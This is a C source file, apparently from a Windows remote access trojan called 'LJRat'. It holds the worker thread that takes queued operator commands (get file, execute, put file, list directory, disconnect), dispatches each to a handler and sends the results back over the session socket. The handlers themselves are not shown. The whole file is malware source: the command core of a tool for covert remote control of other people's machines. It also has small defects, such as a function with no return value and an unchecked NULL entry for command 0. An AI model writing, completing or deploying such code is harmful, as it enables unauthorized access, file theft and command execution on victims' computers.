#define WIN32_LEAN_AND_MEAN

#include "LJRat.h"
#include "worker.h"
#include "list.h"
#include "error_code.h"
#include "message.h"
#include "debug.h"
#include "session.h"
#include "commands.h"

extern SESSION_CTX session_ctx;

enum CMD_TYPE {
    GET = 0x01,
    EXECUTE,
    PUT,
    DIR,
    DISCONNECT
};

static ERROR_T BuildFuncArray()
{
    session_ctx.pFuncArray[1] = GetCmd;
    session_ctx.pFuncArray[2] = ExecuteCmd;
    session_ctx.pFuncArray[3] = PutCmd;
    session_ctx.pFuncArray[4] = DirCmd;
    session_ctx.pFuncArray[5] = DisconnectCmd;
}



static ERROR_T ProcessWork(PMESSAGE pMsg)
{
    INT iError = E_SUCCESS;
    PMESSAGE pResult = NULL;
    CMDFUNC pFunc = NULL;

    if ((FUNCARRAYSIZE - 1) < pMsg->hdr.dwCommand)
    {
        iError = E_CMD_NOT_FOUND;
        DBG_PRINT("Command not found\n");
        goto end;
    }

    pFunc = session_ctx.pFuncArray[pMsg->hdr.dwCommand];

    DBG_PRINT("Len: %d CMD_TYPE: %d JOB_ID: %d\n", pMsg->hdr.dwMessageSize, pMsg->hdr.dwCommand, pMsg->hdr.dwJobID);

    
    iError = pFunc(pMsg, &pResult);

    // TODO Do something when a critical error happens

    if (E_SUCCESS != iError) {
        DBG_PRINT("Error processing work %d\n", iError);
    }

    iError = MessageSend(session_ctx.sock, pResult);
    if (E_SUCCESS != iError) {
        DBG_PRINT("Error sending results\n");
    }

end:
    MessageFree(&pMsg);
    MessageFree(&pResult);
    return iError;
}


unsigned int __stdcall WorkerThread(PVOID pArg)
{
    INT iError = E_SUCCESS;
    PLIST_ITEM pItem = NULL;

    BuildFuncArray();

    while (SHUTDOWN_INITIATED != session_ctx.gShutdown) {

        if (TRUE == SRWListIsEmpty(&session_ctx.job_list)) {
            WaitForSingleObject(session_ctx.hJobWait, INFINITE);
        }

        pItem = (PLIST_ITEM) SRWListRemoveHead(&session_ctx.job_list);
        if (NULL == pItem)
        {
            iError = E_JOB_REMOVE_ERROR;
            goto end;
        }

        ProcessWork((PMESSAGE) pItem->pData);
        HeapFree(GetProcessHeap(), 0, pItem);
        DBG_PRINT("Processed work item\n");
    } 

end:
    return iError;
}


